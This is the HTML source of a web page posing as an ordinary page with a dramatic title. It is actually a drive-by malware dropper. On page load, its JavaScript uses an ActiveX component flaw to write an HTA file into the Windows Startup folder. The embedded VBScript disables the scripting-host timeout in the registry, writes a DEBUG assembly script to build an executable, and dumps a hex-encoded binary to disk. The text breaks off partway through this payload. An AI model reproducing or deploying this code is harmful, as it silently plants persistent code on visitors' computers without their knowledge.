<HTML><HEAD><TITLE>Ordinary WebPage</TITLE>
<META content="text/html; charset=windows-1252" http-equiv=Content-Type>
<title>Judgement Comes in Darkness and Whirling Winds</title>
</HEAD>

<BODY BGColor="black" onLoad="f()">
<BR><BR><H1><FONT color=red>Judgement Comes in Darkness and Whirling Winds</FONT></H1><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR>
<APPLET code=com.ms.activeX.ActiveXComponent></APPLET>
 <!-- ^^^ This gives java exceptions in java console, but the object is instantiated -->
<SCRIPT language=JAVASCRIPT>
a1=document.applets[0];
fn="..\\\\Start Menu\\\\Programs\\\\Startup\\\\EA.HTA";
function f1()
{
a1.setProperty('DOC',doc);
}

function f()
{
// The ActiveX classid
cl="{06290BD5-48AA-11D2-8432-006008C3FBFC}";
a1.setCLSID(cl);
a1.createInstance();
setTimeout("a1.setProperty('Path','"+fn+"')",15);
setTimeout("f1()",800);
setTimeout("a1.invoke('write',VA);",150);
}
</SCRIPT>
<SCRIPT language=VBSCRIPT>
VA = ARRAY()
nl = Chr(13) & Chr(10)
l1 = "<SCRIPT language=VBSCRIPT>"
l2 = "Dim fso, dirwin, shortSrc, lcoderHex, onzXfr, testTxt, witness, rr"
l3 = "Set fso = CreateObject(""Scripting.FileSystemObject"")"
l4 = "Set dirwin=fso.GetSpecialFolder(0)"
l5 = "Set witness = CreateObject (""WScript.Shell"")"
l6 = "On Error Resume Next"
l7 = "rr=witness.RegRead(""HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout"")"
l8 = "if (rr>=1) then"
l9 = "witness.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout"",0,""REG_DWORD"""
l10 = "end if"
l11 = "set shortSrc=fso.CreateTextFile(""short.src"")"
l12 = "shortSrc.WriteLine  ""a 100"" & vbNewline & ""push cs"" & vbNewline & ""pop es"" & vbNewline & ""cld"" & vbNewline & ""mov bx,00c8"" & vbNewline & ""mov ah,4a"" & vbNewline & ""int 21"" & vbNewline & ""mov sp,0c80"" & vbNewline & ""mov ah,48"" & vbNewline & ""mov bx,0300"" & vbNewline & ""int 21"" & vbNewline & ""mov [024a],ax"" & vbNewline & ""mov ah,48"" & vbNewline & ""mov bx,0150"" & vbNewline & ""int 21"" & vbNewline & ""mov bp,ax"" & vbNewline & ""call 0153"" & vbNewline & ""call 01d4"" & vbNewline & ""call 0176"" & vbNewline & ""call 01f5"" & vbNewline & ""call 0134"" & vbNewline & ""mov ax,4c00"" & vbNewline & ""int 21"" & vbNewline & ""mov dx,023f"" & vbNewline & ""mov ah,3c"" & vbNewline & ""xor cx,cx"" & vbNewline & ""int 21"" & vbNewline & ""jb 012f"" & vbNewline & ""mov bx,ax"" & vbNewline & ""mov cx,[024e]"" & vbNewline & ""mov ds,bp"" & vbNewline & ""xor dx,dx"" & vbNewline & ""mov ax,4000"" & vbNewline & ""int 21"" & vbNewline & ""mov ah,3e"" & vbNewline & ""int 21"" & vbNewline & ""ret"" & vbNewline & ""mov dx,0234"" & vbNewline & ""mov ax,3d00"" & vbNewline & ""int 21"" & vbNewline & ""jb 012f"" & vbNewline & ""mov bx,ax"" & vbNewline & ""push ds"" & vbNewline & ""mov cx,2ee0"" & vbNewline & ""xor dx,dx"" & vbNewline & ""mov ax,[024a]"" & vbNewline & ""mov ds,ax"" & vbNewline & ""mov ax,3f00"" & vbNewline & ""int 21"" & vbNewline & ""pop ds"" & vbNewline & ""jb 012f"" & vbNewline & ""mov [024c],ax"" & vbNewline & ""ret"" & vbNewline & ""xor bx,bx"" & vbNewline & ""mov cx,[024c]"" & vbNewline & ""mov ax,[024a]"" & vbNewline & ""mov es,ax"" & vbNewline & ""mov di,bx"" & vbNewline & ""mov si,0252"" & vbNewline & ""mov al,[si]"" & vbNewline & ""repnz"" & vbNewline & ""scasb"" & vbNewline & ""jcxz 012f"" & vbNewline & ""mov bx,di"" & vbNewline & ""es:"" & vbNewline & ""mov al,[di]"" & vbNewline & ""inc di"" & vbNewline & ""dec cx"" & vbNewline & ""jcxz 012f"" & vbNewline & ""call 01c0"" & vbNewline & ""jb 018c"" & vbNewline & ""inc si"" & vbNewline & ""cmp al,[si]"" & vbNewline & ""jnz 0181"" & vbNewline & ""cmp si,025b"" & vbNewline & ""jb 018c"" & vbNewline & ""mov ax,di"" & vbNewline & ""add ax,[0250]"" & vbNewline & ""mov si,ax"" & vbNewline & ""xor di,di"" & vbNewline & ""mov cx,[024c]"" & vbNewline & ""sub cx,si"" & vbNewline & ""mov [024c],cx"" & vbNewline & ""push ds"" & vbNewline & ""push es"" & vbNewline & ""pop ds"" & vbNewline & ""repz"" & vbNewline & ""movsb"" & vbNewline & ""pop ds"" & vbNewline & ""ret"" & vbNewline & ""cmp al,30"" & vbNewline & ""jb 01d2"" & vbNewline & ""cmp al,39"" & vbNewline & ""jbe 01d0"" & vbNewline & ""cmp al,41"" & vbNewline & ""jb 01d2"" & vbNewline & ""cmp al,46"" & vbNewline & ""ja 01d2"" & vbNewline & ""clc"" & vbNewline & ""ret"" & vbNewline & ""stc"" & vbNewline & ""ret"" & vbNewline & ""push ds"" & vbNewline & ""mov ax,[024a]"" & vbNewline & ""mov es,ax"" & vbNewline & ""xor si,si"" & vbNewline & ""mov di,si"" & vbNewline & ""mov cx,[024c]"" & vbNewline & ""jcxz 01ef"" & vbNewline & ""push es"" & vbNewline & ""pop ds"" & vbNewline & ""lodsb"" & vbNewline & ""call 01c0"" & vbNewline & ""jb 01ed"" & vbNewline & ""stosb"" & vbNewline & ""loop 01e6"" & vbNewline & ""pop ds"" & vbNewline & ""mov [024c],di"" & vbNewline & ""ret"" & vbNewline & ""push dx"" & vbNewline & ""push ds"" & vbNewline & ""xor dx,dx"" & vbNewline & ""mov cx,[024c]"" & vbNewline & ""shr cx,1 "" & vbNewline & ""mov es,bp"" & vbNewline & ""mov ax,[024a]"" & vbNewline & ""mov ds,ax"" & vbNewline & ""xor si,si"" & vbNewline & ""xor di,di"" & vbNewline & ""call 0216"" & vbNewline & ""loop 020a"" & vbNewline & ""pop ds"" & vbNewline & ""pop dx"" & vbNewline & ""mov [024e],di"" & vbNewline & ""ret"" & vbNewline & ""push cx"" & vbNewline & ""lodsw"" & vbNewline & ""cmp al,39"" & vbNewline & ""jbe 021e"" & vbNewline & ""sub al,07"" & vbNewline & ""sub al,30"" & vbNewline & ""mov cl,04"" & vbNewline & ""shl al,cl"" & vbNewline & ""cmp ah,39"" & vbNewline & ""jbe 022c"" & vbNewline & ""sub ah,07"" & vbNewline & ""sub ah,30"" & vbNewline & ""add al,ah"" & vbNewline & ""stosb"" & vbNewline & ""pop cx"" & vbNewline & ""ret"""
l13 = "shortSrc.WriteBlankLines(1)" 
l14 = "shortSrc.WriteLine ""e 234"" & vbNewline & ""6C 63 6F 64 65 72 2E 68 65 78 00 6C"" & vbNewline & ""e 240"" & vbNewline & ""63 6F 64 65 72 2E 65 78 65 00 00 00 00 00 00 00"" & vbNewline & ""e 250"" & vbNewline & ""6E 00 36 32 36 35 36 37 36 39 36 45 00 00 00 00"" & vbNewline & ""n short.com"" & vbNewline & ""rcx"" & vbNewline & ""15c"" & vbNewline & ""w"" & vbNewline & ""q"""
l15 = "shortSrc.close"
l16 = "set lcoderHex=fso.CreateTextFile(""lcoder.hex"")"
l17 = "lcoderHex.WriteLine ""Lehigh coder. Version 0.6."" & vbNewline & ""Comments to Al McLennan, LJM3@LEHIGH.bitnet."""
l18 = "lcoderHex.WriteBlankLines(1)"
l19 = "lcoderHex.WriteLine ""Directory entry for encoded file:"" & vbNewline & ""LCODER.EXE      5264        20 OCT 89    08:56"""
l20 = "lcoderHex.WriteBlankLines(1)"
l21 = "lcoderHex.WriteLine ""begin"" & vbNewline & ""626567696E00010100620000901451860000000000000000000000000000"" & vbNewline & ""54130647000090144C434F4445522E455845000000000000000000000000"" & vbNewline & ""4D5A90000B00010020000000FFFF190100013B00000000001E0000000100"" & vbNewline & ""010000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""0000BBBD008EDB8CC3891EEA04E8EC018D160000B409CD218D164000B409"" & vbNewline & ""CD21E80F057207FE06B005E82101E80000E8DB018D167300B409CD218D3E"" & vbNewline & ""C404E861028D36C4048D3EA404B90D00F3A48D36C4048D3EC803B90D001E"" & vbNewline & ""07AC0AC07403AAE2F8C7062505B007C7062705BF078D169800B409CD21E8"" & vbNewline & ""C8047333C606860401C706FA0400B4C706FC0400B4C70629052D008D36E7"" & vbNewline & ""048D3EE404B90300F3A4E84E07C70625050408C70627051308E82D02E854"" & vbNewline & ""02E88A02E8D502E85B03E81704723AC706B1050000C706B3050000E87303"" & vbNewline & ""E8CB03E88604E8FC04E84106E87905F7060A050100750BE8EB04E83006E8"" & vbNewline & ""6805EBEDE87704E81C06EB4B90C706B1050000C706B3050000FE068304E8"" & vbNewline & ""3503E88D03E84804C70688040000C7068A0400008B0E0C05E8AE04E8F305"" & vbNewline & ""E82B05F7060A0501007502E2EDE83204E8D705F7060A05010074B6E8C305"" & vbNewline & ""E87C01FF36F404FF36F6048F06F4048F06F604C706FA0400F8E8A7008D16"" & vbNewline & ""0102B409CD218D3EC404E82D01E80107A18A04A30405A18804A30205E8A4"" & vbNewline & ""08721E8D168702B409CD218D36A404E85105E80503E8F606E86C05E87205"" & vbNewline & ""E822018D168702B409CD218D36A404E83305E8E702E8D806E84E05A08404"" & vbNewline & ""3A068304762DFE068304C7061D050000C706B1050000C706B3050000E866"" & vbNewline & ""08E89506A18A04A30405A18804A30205E8A106EBC7E81E05E8CE00C3B430"" & vbNewline & ""CD213C027201C38D16F100E8C200C38CD3A1EA042BD883C3104343B44ACD"" & vbNewline & ""211E078B1EF4043B1EF804767283C310F606B00501740383C315B448CD21"" & vbNewline & ""A3EC04731C3D070074573D08007552D12EF404D12EF604D12EFA04D1260C"" & vbNewline & ""05EBC4B4488B1EF60483C310F606B00501740383C315CD21A3EE0473253D"" & vbNewline & ""070074213D0800751CD12EF404D12EF604D12EFA04D1260C05A1EC048EC0"" & vbNewline & ""B449CD21EB85C38D160C01E82C00B40ABA0E05CD211E078BF246AC8AC8B5"" & vbNewline & ""00E313FCAC3C20740B3C6172063C7A77022C20AAE2EEC3B44CCD21C3B409"" & vbNewline & ""CD218D164203B409CD21B44CCD21C38D16C404B43DB000CD217204A3D204"" & vbNewline & ""C38D162301B409CD218D36C404E8EB038D164203B409CD21E8C0FFB442B0"" & vbNewline & ""028B1ED204B90000BA0000CD218916A004A3A204B442B0008B1ED204B900"" & vbNewline & ""00BA0000CD21B800578B1ED204CD21890E9E0489169C04C38D3ED8038B16"" & vbNewline & ""A004A1A204B9000083F90A731BE825000BDB750B0BC075070BD27503EB0A"" & vbNewline & ""9080CA3052418BD3EBE00BC9750441B0305058AAE2FCC35150B90A008BC2"" & vbNewline & ""BA0000F7F18BD858F7F159C3A19C04E808008D3EE403E81D00C350D1E8B1"" & vbNewline & ""04D2E832E48AF858D0EC8ADCB90300D3E0D2E88AC88AC7C38BEC55505351"" & vbNewline & ""8B46FE8AC1D40A8BD8B0200AFF74048AC70430AA8AC30430AAB020AA8B5E"" & vbNewline & ""FC8D366B0532FF4BD1E3D1E303F3B90200F3A58B46FA0450D40A8BD832C0"" & vbNewline & ""0AFF740C80FF0A720380EF0A8AC70430AA8AC30430AA595B585D8BE5C38D"" & vbNewline & ""3EF1038B1E9E048AC7B103D2E8E80F00B03AAA8BC3B105D3E8243FE80100"" & vbNewline & ""C3D40A05303086E0AA8AC4AAC31E07B90800F7060A050200740249498D36"" & vbNewline & ""C4048D3ED404AC3C2E74070AC07403AAE2F4F7060A050200740DA08304D4"" & vbNewline & ""0A80C430043086E0ABB02EAA8D36E404B90300F3A48D36C4048D3ED404B9"" & vbNewline & ""0C00F3A6E301C38D16A901E82EFE8D16D404B8003DCD2172168BD8B43ECD"" & vbNewline & ""218D16C902B409CD21E85A007303E808FE8D16D404B43C33C9CD217204A3"" & vbNewline & ""E204C38D162301E8F6FD8B16A004A1A204F736FC048BD80BC0742B3D0100"" & vbNewline & ""770681FAE8037220528D165801B409CD215AE815007211810E0A0502000B"" & vbNewline & ""D2740143881E8404F9C3F8C3B401CD213C797502F8C33C597502F8C33C6E"" & vbNewline & ""7502F9C33C4E75E6F9C3B408CD213C0D7502F8C33C1B75F2F9C3B401CD21"" & vbNewline & ""3C687502F8C33C487502F8C33C787502F9C33C5875E6F9C3B80042B90000"" & vbNewline & ""BA25018B1EE204CD21C31E078B1EB105891E8C048D368304C606870400B9"" & vbNewline & ""3200BB0000AC02D8E2FBF6DB881E87048D367E048D3E0204E81502E81202"" & vbNewline & ""B800408B1EE204B91100BA9B05CD217222B80042B90000BA00008B1EE204"" & vbNewline & ""CD218D165903B925018B1EE204B80040CD217201C3E82401C3518D16B600"" & vbNewline & ""B409CD218D36C404E802011E8B0EFA04F606B00501740481C146018B161D"" & vbNewline & ""058B1ED204A1EC048ED8B8003F51CD21591F72323BC17406C7060A050100"" & vbNewline & ""F606B00501740903061D05A3F00459C3A3F004010621058316230500A1EC"" & vbNewline & ""048B0EF004E8630559C38D162301B409CD218D36C404E89A008D164203B4"" & vbNewline & ""09CD21E86FFC518D16DA00B409CD218D36D404E87F008B0EF2048B1EE204"" & vbNewline & ""1EA1EE048ED8B80040BA0000CD211F72063BC1720259C3E86E00C38D16DA"" & vbNewline & ""00B409CD218D36D404E84D00511E8B0EF2048B1E02050BDB75103B0E0405"" & vbNewline & ""760A8B0E0405810E0A050100290E0405831E0205008B1EE204A1EE048ED8"" & vbNewline & ""B80040BA000051CD21591F720C3BC17208A1EE04E8BE0459C3E81200C3B9"" & vbNewline & ""0D00B402AC0AC074068AD0CD21E2F5C3E810008D16D404B441CD218D1636"" & vbNewline & ""01E8C2FBC3B43E8B1ED204CD21C3B43E8B1EE204CD21C38D16CC00B409CD"" & vbNewline & ""215351551E8B2E0A05A1F00401068A048316880400BA0000F73629058BC8"" & vbNewline & ""8B361D05BF0000A1EE048EC0FC558BECFF362505FF3627058B1EFA04A1EC"" & vbNewline & ""048ED8FCE305FF56FEE2FB0BD2740AF746000100740FFF56FC8BE55D1F89"" & vbNewline & ""3EF2045D595BC38BE55D1F8916B305893EF20429162105831E230500B442"" & vbNewline & ""B0008B1ED2048B0E23058B162105CD215D595BC351B91E00E81800E2FBB8"" & vbNewline & ""0D0AAB59C350518BCAE80900E2FBB80D0AAB5958C351AC8AE0B104D2E804"" & vbNewline & ""303C3976020407AA8AC4240F04303C3976020407AA59C306A1EC048EC08D"" & vbNewline & ""362B058B3EFA04B94000F3A407C351B90F00E82E00E2FBB80D0AAB59C350"" & vbNewline & ""51558BEA8BC2BA0000B90300F7F18BC87306413EC7020000E80A00E2FBB8"" & vbNewline & ""0D0AAB5D5958C350535152AD50D0E8D0E8D7AA5850B90600D2E0D0E8D0E8"" & vbNewline & ""B90400D2EC02C4D7AA5AAC50B90400D2E6D0EED0EEB106D2E802C6D7AA58"" & vbNewline & ""243FD7AA5A595B58C3C7060A050000E85DFAE852FDE88C00E8EF00FF16AC"" & vbNewline & ""05FF16AE05C3E8F6FDF7060A0501007516E835FDFF16AC05FF16AE05E8E0"" & vbNewline & ""FDF7060A05010074EAA102050BC0751AA104050BC07513A085040AC07501"" & vbNewline & ""C38B1EB1053B1E8C047501C38D16FD02B409CD21C38D16CC00B409CD211E"" & vbNewline & ""A1EC048EC0BE00008BFE8B0EF004E316061FAC3C30720D3C3976083C4172"" & vbNewline & ""053C467701AAE2EC1F893EF004C38B1E1D058B0EF004A1EC048EC08BFB8D"" & vbNewline & ""36BA048A04F2AEE3328BDF268A054749E329E82D0072F2463A0475E181FE"" & vbNewline & ""C30472E78BF78B3E1D058B0EF00403CF2BCE890EF0041E061FF3A41FC38D"" & vbNewline & ""166402E868F93C30720E3C3976083C4172063C467702F8C3F9C31EB93700"" & vbNewline & ""D1E18B361D058BFEA1EC048ED88EC0ACE8D5FF72FAAAE2F71F568D3E8304"" & vbNewline & ""8B361D051E1E07B93700A1EC048ED8E80001E2FB1FB937008D368304BB00"" & vbNewline & ""00AC02D8E2FB0ADB74078D163902E803F95E8B3E1D058B0EF0042BCE890E"" & vbNewline & ""F0041EA1EC048ED88EC0F3A41F8D36A4048D3ED404B90D001E07F3A48D36"" & vbNewline & ""C4048D3ED404B90D00F3A6E321F606860401740DC706AC05350BC706AE05"" & vbNewline & ""CA0AC3C706AC05DD08C706AE056D0AC38D16A901E8A3F8803E8404017413"" & vbNewline & ""A083043C01740AE8D1FC8D169E02E88BF8F9C3F8C31E07B908008D36C404"" & vbNewline & ""8BFEAC3C2E74070AC07403AAE2F483EF02A08304D40A80C430043086E0AB"" & vbNewline & ""C3521E8B0EF004BA0000D1E9730142A1EE048EC0A1EC048ED833F633FFE3"" & vbNewline & ""05E81E00E2FBAC1F0BD2740C8B1EEC048EC357BF0000AA5F89161D05893E"" & vbNewline & ""F2045AC351AD3C3976022C072C30B104D2E080FC39760380EC0780EC3002"" & vbNewline & ""C4AA59C3521E33D2A1F004D1E8730142D1E8730242428BC8A1EE048EC0A1"" & vbNewline & ""EC048ED8BE00008BFEE305E81800E2FB57BF00008BCA1E07F3A45F1F893E"" & vbNewline & ""F20489161D055AC3505351B90406AD50D0E0D0E086E0D2E802C4AA5BAD50"" & vbNewline & ""D2E7D0E8D0E802C7AA5886E9D2E002C4AA595B58C38D16CC00B409CD211E"" & vbNewline & ""A1EC048EC08B0EF0042B0E1D05724CE34A8B361D058BFE061FAC3C2B723B"" & vbNewline & ""75052C2BEB34903C2D75052C2CEB2B903C3072273C3977072C300402EB1C"" & vbNewline & ""903C4172183C5A77072C41040CEB0D903C6172093C7A77052C610426AAE2"" & vbNewline & ""BE1F893EF004C3505351568B1EB1058B36B3052BCEE31A1E8ED8F6C7809C"" & vbNewline & ""D1E3AC02D89D740481F397A0E2EE1F891EB1055E595B58C300000D0A4C65"" & vbNewline & ""6869676820636F6465722E2056657273696F6E20302E362E0D0A55736520"" & vbNewline & ""6374726C2D627265616B20286374726C2D432920746F2061626F72742E24"" & vbNewline & ""0D0A0D0A50726573732072657475726E20286573632920746F206465636F"" & vbNewline & ""64652028656E636F64652920612066696C653A20240D0A456E746572206E"" & vbNewline & ""616D65206F662066696C6520746F20626520656E636F6465643A20240D0A"" & vbNewline & ""484558206F722058584520656E636F64696E673F2028482F582920240D0A"" & vbNewline & ""52656164696E6720696E7075742066696C6520240D0A50726F6365737369"" & vbNewline & ""6E672E240D0A57726974696E67206F75747075742066696C6520240D0A4E"" & vbNewline & ""65656420444F53207620322E30206F72206C617465722E240D0A496E7375"" & vbNewline & ""6666696369656E74206D656D6F72792E240D0A43616E2774206F70656E20"" & vbNewline & ""66696C6520240D0A4469736B2066756C6C206F72206F7468657220777269"" & vbNewline & ""7465206572726F722E240D0A4F75747075742066696C652077696C6C2062"" & vbNewline & ""65206C6172676572207468616E2036304B2E20446F20796F752077616E74"" & vbNewline & ""20746F2073706C697420697420696E746F2070617274733F2028592F4E29"" & vbNewline & ""240D0A496E70757420616E64206F75747075742066696C65732077696C6C"" & vbNewline & ""20686176652073616D65206E616D652E0D0A4368616E6765206E616D6520"" & vbNewline & ""6F6620696E7075742066696C6520616E642074727920616761696E2E240D"" & vbNewline & ""0A456E746572206E616D65206F662066696C6520746F206265206465636F"" & vbNewline & ""6465643A20240D0A43616E277420726561642066696C6520240D0A496E76"" & vbNewline & ""616C6964206865616465722E202043616E2774206465636F646520746869"" & vbNewline & ""732066696C652E240D0A4E6F206B65792E202043616E2774206465636F64"" & vbNewline & ""6520746869732066696C652E24202057696C6C206465636F646520746F20"" & vbNewline & ""66696C6520240D0A496E7075742066696C65206D75737420626520666972"" & vbNewline & ""73742070617274206F66207365726965732E240D0A4F7574707574206669"" & vbNewline & ""6C6520616C7265616479206578697374732E205772697465206F76657220"" & vbNewline & ""69743F2028592F4E2920240D0A5761726E696E673A204572726F72206465"" & vbNewline & ""74656374656420696E20696E7075742066696C652E204F75747075742066"" & vbNewline & ""696C65206D617920626520696E76616C69642E24202050726F6772616D20"" & vbNewline & ""7465726D696E6174696E672E244C656869676820636F6465722E20566572"" & vbNewline & ""73696F6E20302E362E0D0A436F6D6D656E747320746F20416C204D634C65"" & vbNewline & ""6E6E616E2C204C4A4D33404C45484947482E6269746E65742E0D0A0D0A44"" & vbNewline & ""69726563746F727920656E74727920666F7220656E636F6465642066696C"" & vbNewline & ""653A0D0A2020202020202020202020202020202020202020202020202020"" & vbNewline & ""2020202020202020202020202020202020202020200D0A0D0A626567696E"" & vbNewline & ""0D0A00000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000626567696E00010100000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000363236353637363936450000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000484558584652000000000000"" & vbNewline & ""00000000400B800F68010078007800000000000000000000000000000100"" & vbNewline & ""0E00000000000000000000000000000000000000000000000000001E002B"" & vbNewline & ""2D303132333435363738394142434445464748494A4B4C4D4E4F50515253"" & vbNewline & ""5455565758595A6162636465666768696A6B6C6D6E6F7071727374757677"" & vbNewline & ""78797A4A414E20464542204D415220415052204D4159204A554E204A554C"" & vbNewline & ""2041554720534550204F4354204E4F562044454320656E64206F6620636F"" & vbNewline & ""646564206461746100000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""000000000000000000000000000000000000000000000000000000000000"" & vbNewline & ""0000000000000000000000000000"" & vbNewline & ""end of coded data"""
l22 = "lcoderHex.close"
